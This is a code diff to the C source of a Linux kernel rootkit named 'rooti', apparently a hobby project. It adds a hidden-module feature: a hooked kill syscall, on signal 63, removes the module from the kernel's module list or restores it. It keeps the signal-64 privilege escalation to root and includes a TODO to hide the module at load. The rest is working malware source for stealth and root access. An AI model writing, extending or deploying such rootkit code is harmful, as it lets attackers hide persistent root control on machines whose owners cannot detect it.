@@ -12,8 +12,11 @@ MODULE_AUTHOR("Omri Ben Zikri");
 MODULE_DESCRIPTION("Very fun rootkit");
 MODULE_VERSION("1.0.0");
 
-// Unused signal number, used to request a privilege escalation to root
-#define ROOTI_SIG_PE 64
+// Unused signal numbers can, be used by the rootkit for its own purposes
+enum rooti_signals {
+    ROOTI_SIG_HIDE = 63,  // toogle hiding of this kernel module
+    ROOTI_SIG_PE = 64  // request for privilege escalation to root
+};
 
 /*
     This struct stores some file descriptor that is of interest to us which was opened
@@ -26,7 +29,15 @@ struct rooti_tamper_fd {
     struct list_head head;  // linked list head
 };
 
+// List of FDs to /dev/random or /dev/urandom by usermode processes
 static LIST_HEAD(rooti_random_tamper_fds);
+
+/* Indicates whether the rootkit is missing from the list of kernel modules (e.g is hidden).
+ * When hidden, the variable rooti_prev_module stores the address of the node that was previous
+ * before this module in the list, otherwise it is NULL;
+*/
+static short rooti_hidden = false;
+static struct list_head *rooti_prev_module = NULL;
 
 static asmlinkage long (*orig_kill)(const struct pt_regs *regs);
 static asmlinkage long (*orig_openat)(const struct pt_regs *regs);
@@ -55,10 +66,30 @@ static int elevate_privilege(void)
     return 0;
 }
 
+static void rooti_hideme(void) {
+    rooti_hidden = true;
+    rooti_prev_module = THIS_MODULE->list.prev;
+    list_del(&THIS_MODULE->list);
+}
+
+static void rooti_showme(void) {
+    rooti_hidden = false;
+    list_add(&THIS_MODULE->list, rooti_prev_module);
+    rooti_prev_module = NULL;
+}
+
 static asmlinkage long hook_kill(const struct pt_regs *regs)
 {
     int sig = regs->si;
-    if (sig == ROOTI_SIG_PE) {
+    if (sig == ROOTI_SIG_HIDE) {
+        if (rooti_hidden) {
+            rooti_showme();
+        } else {
+            rooti_hideme();
+        }
+        return 0;
+    }
+    else if (sig == ROOTI_SIG_PE) {
         return elevate_privilege();
     }
     return orig_kill(regs);
@@ -193,6 +224,8 @@ static int __init rooti_init(void)
         printk(KERN_DEBUG "rooti: rooti_install_hooks() failed: %d\n", ret);
         return ret;
     }
+
+    // TODO: at some point rooti_hideme() should be called on init
 
     return 0;
 }
